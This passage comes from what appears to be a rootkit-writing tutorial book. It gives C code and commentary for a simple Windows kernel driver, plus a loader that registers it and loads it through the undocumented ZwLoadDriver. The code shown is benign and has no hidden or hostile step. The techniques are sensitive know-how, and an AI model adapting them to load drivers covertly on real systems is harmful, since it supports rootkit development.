style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>_RtlInitAnsiString(&amp;aStr,&quot;\\Registry\\Machine\\System\\CurrentControlSet\\Services\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>_RtlAnsiStringToUnicodeString(&amp;uStr,
&amp;aStr, TRUE);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>_ZwUnloadDriver(&amp;uStr);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DeleteFile(&quot;C:\\winnt\\system32\\drivers\\&quot;DRV_FILENAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>RegDeleteKey(HKEY_LOCAL_MACHINE,
&quot;System\\CurrentControlSet\\Services\\&quot;DRV_NAME&quot;\\Enum&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>RegDeleteKey(HKEY_LOCAL_MACHINE,
&quot;System\\CurrentControlSet\\Services\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING
gDeviceName,gSymbolicLinkName;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>PDEVICE_OBJECT
gpDeviceObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
DRV_NAME L&quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>PIO_STACK_LOCATION
esp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>esp
= IoGetCurrentIrpStackLocation(pIrp);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;DriverDispatcher
=%x&quot;,pDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>if
(esp-&gt;MajorFunction == IRP_MJ_CREATE)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>if
(esp-&gt;MajorFunction == IRP_MJ_DEVICE_CONTROL)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_DEVICE_CONTROL\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>pIrp-&gt;IoStatus.Status
= STATUS_SUCCESS;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>pIrp-&gt;IoStatus.Information
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(pIrp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading
=%x&quot;,DriverObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IoDeleteSymbolicLink(&amp;gSymbolicLinkName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IoDeleteDevice(gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gDeviceName,L&quot;\\Device\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gSymbolicLinkName,L&quot;\\DosDevices\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IoCreateDevice
(driverObject,0,&amp;gDeviceName,FILE_DEVICE_UNKNOWN,0,0,&amp;gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IoCreateSymbolicLink(&amp;gSymbolicLinkName,
&amp;gDeviceName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
9 =%x gpDeviceObject=%x&quot;,driverObject,gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>Vijay
8 =817045b0 gpDeviceObject=816fd910<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DriverDispatcher
=816fd910<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IRP_MJ_CREATE<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DriverDispatcher
=816fd910<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IRP_MJ_DEVICE_CONTROL<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>Unloading
=817045b0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>In
the next example, we keep all the other files the same, but make a major change
in the file y.c. The only problem with loading a device driver was that the
functions used all very well documented by windows. Thus we thought lets load
our device driver in memory by using functions that are not documented. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>We
went to a site in Singapore called <a href="http://www.security.org.sg/code"><span
style='mso-bidi-font-size:10.0pt;mso-bidi-font-family:Arial'>www.security.org.sg/code</span></a>.
Here we downloaded a project kProcCheck that shows us how to load a device
driver using undocumented functions. The point we are making is that the art of
writing toolkits is not American and throughout the book we will be showcasing
ideas that we have learned from all over the world. The best site however is
American called <a href="http://www.rootkit.com/"><span style='mso-bidi-font-size:
10.0pt;mso-bidi-font-family:Arial'>www.rootkit.com</span></a> and it owner Greg
Hoglund is the undisputed father of writing toolkits. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>To
say thank you to him, we bought his book and advise you to also. Back to work.
The variable names used keep changing as we normally use the same variable
names that the program we learnt from does.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>In
the world of programming device drivers all code that we use comes from ntdll.
The last time we used this dll we used function LoadLibrary to load it in
memory. This is one dll that is always present in memory as windows
automatically loads this and kernel32.dll in memory at startup. This we use the
function GetModuleHandle to gives us a handle or a number that tells us where
this dll starts in memory. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>We
would like to call four functions from this dll, NtLoadDriver and
NtUnloadDriver which are undocumented and do what the name suggests. The
RtlAnsiStringToUnicodeString does what the name says, converts a Ansi or ASCII
string to Unicode and RtlInitAnsiString that initializes a ANSI string like RtlInitUnicodeString
does. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>The
only difference between the ANSI_STRING and UNICODE_STRING structures is that
the pointer to unsigned short is replaced by a pointer to char. No other
difference as the two length members have the same purpose. We also create variables
like _ZwLoadDriver, which would store the address of the corresponding function
and as these are all stdcall functions, the callee and not the caller restores
the stack.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>We
first check using the strcmp function whether the user has type –I<span
style="mso-spacerun: yes">  </span>to install or –u to uninstall. To install
the driver we first use the copy file function where we first specify the
source file name and copy this file to the destination, the second parameter.
We use macros to get the final names and copy the device driver file vijay.sys
in our case to the C:\\winnt\\system32\\drivers. This is where windows expects
all our device drivers to be. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>Each
time windows load our device driver in memory the second parameter to the
DriverEntry function is the registry path that the driver should use. We thus
use the function RegCreateKey to create a registry key
System\\CurrentControlSet\\Services\\vijayd off the main hive
HKEY_LOCAL_MACHINE. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>The
last parameter of the function RegCreateKey gives us a HKEY that we use for
further registry access. We create four sub keys, the first being Type and set
it to 1. The RegSetValueEx takes 6 parameters, the first the key, the second
the name of the sub-key, the second last the address of a variable that
contains the value and the last parameter the size of data to be written. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>We
then set the ErrorControl value also to 1. The Start value is set to 3 and
ImagePath to the full path name of the driver file<span style="mso-spacerun:
yes">  </span>i.e C:\winnt\system32\drivers\vijay.sys. These registry entries
are created by the service manager functions. We then create a ANSI_STRING and
set it to a value equal to the first registry key that we have created <a
href="file:////Registry//Machine//System//CurrentControlSet//Services//vijayd"><span
style='mso-bidi-font-size:10.0pt;mso-bidi-font-family:Arial'>\\Registry\\Machine\\System\\CurrentControlSet\\Services\\vijayd</span></a>.
<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>We
then create a UNICODE_STRING from this ansi string using the function
RtlAnsiStringToUnicodeString. We directly could have used the function
RtlInitUnicodeString as we have been using in the past, but the code we saw did
it in a indirect way and so do we. Use whichever method you like. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>We
then use the ZwLoadDriver function to load the driver passing it the registry
key stored in the variable uStr. Thus someone found out that the service
functions first create the registry entries and the call the function
ZwLoadDriver passing it the starting registry key that has a specified format.
We then use functions CreateFile and DeviceIoControl to communicate with our
device driver.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>That
install the driver and it is faster than using the service manager functions.
The uninstall part simply uses function ZwUnloadDriver passing it the
UNICODE_STRING structure with the same registry name. We then delete the file
vijay.sys that we copied into the driver directory. We also delete the main
registry key created and a Enum key that we did not create using the function
RegDeleteKey.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>This
calls the function DriverUnload in our driver. In the driver file r.c we have added
some code to further explain some concepts.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>The
DriverObject function is passed a pointer to the DRIVER_OBJECT structure that
represents our driver. In our case the value is 817045b0. This same pointer is
passed to the DriverUnload function. We create a device vijayd using the
function IoCreateDevice. This gives us DEVICE_OBJECT pointer that starts at
816fd910. Each time our driver dispatch function is called we are passed this
object which represents our device. Thus we are working with two objects DRIVER_OBJECT
and DEVICE_OBJECT during the life cycle of our driver.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>y.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>long
b,howmany;int arr[2];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>hDevice
= CreateFile(&quot;\\\\.\\&quot;DRV_NAME, GENERIC_WRITE | GENERIC_READ,
FILE_SHARE_READ | FILE_SHARE_WRITE,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
NULL);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>howmany
= 12;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DeviceIoControl(hDevice,3
&lt;&lt; 2,(void *)&amp;howmany,4,&amp;arr,8,&amp;b,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>printf(&quot;b=%d
return is %d %d\n&quot;,b,arr[0],arr[1]);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING
gDeviceName,gSymbolicLinkName;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>PDEVICE_OBJECT
gpDeviceObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
DRV_NAME L&quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>PIO_STACK_LOCATION
irpStack;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>irpStack
= IoGetCurrentIrpStackLocation (Irp);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>if
(irpStack-&gt;MajorFunction == IRP_MJ_CREATE)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>if
(irpStack-&gt;MajorFunction == IRP_MJ_DEVICE_CONTROL)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>long
*inputBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>int
inputBufferLength,outputBufferLength,ioControlCode,ans,io1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>int
*outputBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>inputBuffer
= Irp-&gt;AssociatedIrp.SystemBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>inputBufferLength
= irpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>outputBuffer
= Irp-&gt;AssociatedIrp.SystemBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
